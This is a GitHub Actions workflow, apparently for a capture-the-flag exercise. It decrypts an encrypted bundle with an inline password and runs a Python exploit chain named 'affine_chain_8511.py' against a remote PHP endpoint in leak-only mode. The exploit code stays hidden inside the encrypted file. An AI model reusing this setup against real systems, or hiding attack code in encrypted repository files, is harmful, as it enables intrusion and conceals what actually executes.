name: Remote proof

on:
  push:
    branches:
      - cloudflare-ctf-run
  workflow_dispatch:

permissions:
  contents: read

concurrency:
  group: cloudflare-ctf-proof
  cancel-in-progress: true

jobs:
  prove:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
      - name: Run Cloudflare PHP CTF chain
        run: |
          openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -in cloudflare-ctf.enc -out /tmp/cloudflare-ctf.tar.gz -pass pass:cloudflare-ctf-run
          tar -C /tmp -xzf /tmp/cloudflare-ctf.tar.gz
          cd /tmp/cf-action-bundle
          set +e
          python affine_chain_8511.py --target https://php-rce.cloudflare.app --endpoint /php/index.php --warmup warmup.bin --a1 a1-physical-pages-2.bin --b1 b1-small-1-1000-files160.bin --query-order 1234 --leak-length 0x1000 --leak-only --pipeline-pairs > /tmp/cloudflare-proof.log 2>&1
          status=$?
          cat /tmp/cloudflare-proof.log
          exit "$status"
